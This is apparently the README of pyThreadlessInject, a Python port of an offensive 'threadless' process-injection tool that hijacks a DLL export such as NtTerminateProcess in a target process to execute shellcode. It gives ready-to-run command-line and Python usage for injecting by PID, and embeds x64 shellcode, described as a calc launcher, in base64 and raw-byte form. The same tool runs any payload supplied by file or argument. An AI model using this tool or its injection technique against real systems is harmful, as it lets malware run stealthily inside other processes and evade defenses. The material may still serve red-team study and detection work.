# pyThreadlessInject

A python port of CCob's [ThreadlessInject](https://github.com/CCob/ThreadlessInject), because why should C# have all the fun?!

## Commandline usage

### Help

```cmd
python .\threadlessinject.py -h
```

### Basic execution (uses calc.exe shellcode by default)

```cmd
python .\threadlessinject.py -d ntdll.dll -e NtTerminateProcess -p 10184 
```

### Executing base64 encoded shellcode

```cmd
python .\threadlessinject.py -d ntdll.dll -e NtTerminateProcess -p 10184 -r U1ZXVVRYZoPk8FBqYFpoY2FsY1RZSCnUZUiLMkiLdhhIi3YQSK1IizBIi34wA1c8i1wXKIt0HyBIAf6LVB8kD7csF41SAq2BPAdXaW5Fde+LdB8cSAH+izSuSAH3mf/XSIPEaFxdX15bww==
```

### Executing shellcode from file

```cmd
python .\threadlessinject.py -d ntdll.dll -e NtTerminateProcess -p 10184 -f c:\Users\IEUser\Downloads\shellcode.bin
```

## Programmatic usage

### Basic execution (uses calc.exe shellcode by default, and wait time of 60 seconds)

```python
import threadlessinject
dll = b'ntdll.dll'
export = b'NtTerminateProcess'
pid = 10184
threadlessinject.threadlessInject(dll, export, pid)
```

### Executing shellcode with custom wait time (only accept raw bytes of shellcode)

```python
import threadlessinject
dll = b'ntdll.dll'
export = b'NtTerminateProcess'
pid = 10184
wait = 120
shellcode = b"\x53\x56\x57\x55\x54\x58\x66\x83\xE4\xF0\x50\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x29\xD4\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4\x68\x5C\x5D\x5F\x5E\x5B\xC3"
threadlessinject.threadlessInject(dll, export, pid, waitTime=wait, shellcodeBytes=shellcode)
```

## Commandline args

- -h/--help&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;`Provides help menu`
- -d/--dll&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; `The DLL that that contains the export to patch (must be KnownDll)`
- -e/--export&nbsp; &nbsp; &nbsp; `The exported function that will be hijacked`
- -p/--pid&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;`Target process ID to inject`
- -w/--wait&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;`Time to wait for execution before cleanup will be abandoned`
- -r/--raw&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;`Base64 for x64 shellcode payload (default: calc launcher)`
- -f/--file&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; `File for x64 shellcode payload (default: calc launcher)`

## Gotchas

As mentioned in the last programmatic example, when the shellcodeBytes arg is supplied, it must be the bytes of the actual shellcode to be injected, when calling threadlessinject from cmd it converts the raw or file arguments into the shellcode needed for execution.

## Thanks

[CCob](https://github.com/CCob) for the [ThreadlessInject](https://github.com/CCob/ThreadlessInject) project, which this is ported from

[Rasta Mouse](https://github.com/rasta-mouse) for their work on [ThreadlessInject](https://github.com/CCob/ThreadlessInject) as well

[natesubra](https://github.com/natesubra) for showing me the [ThreadlessInject](https://github.com/CCob/ThreadlessInject) project in the first place, such a cool project I wanted to try and understand it better, hence this repo
